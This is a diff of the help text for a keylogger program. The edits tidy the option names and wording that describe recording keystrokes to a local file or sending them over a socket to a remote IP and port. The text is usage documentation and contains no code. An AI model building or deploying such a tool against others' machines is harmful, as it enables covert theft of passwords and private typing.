@@ -16,7 +16,7 @@ This program propose 2 type of keylogger
 
 ### [REQUIERED] Please, choose one of them
 
-        -l | --local : local keylogger, store data into file on this computer, require 1 argument (destination file)
+        -l | --local : local keylogger, store data into file on this computer, require 1 argument (destination_file)
                 Example : ./bin/main.exe -l D:\file.txt
 
         -r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)
@@ -30,9 +30,9 @@ This program propose 2 type of keylogger
         -a | --alphabet_only : Store alphabet only, A-z (based on ascii)
                 Example : ./bin/main.exe ... -a
 
-        -C | --store_character : Default storage format is int, use this option if you want to store as character
+        -C | --storage_format_character : Default storage format is int, use this option if you want to store as character
                 Example : ./bin/main.exe ... -C
 
-        -h | --help : print this help
+        -h | --help : Show this help
                 Example : ./bin/main.exe -h
 
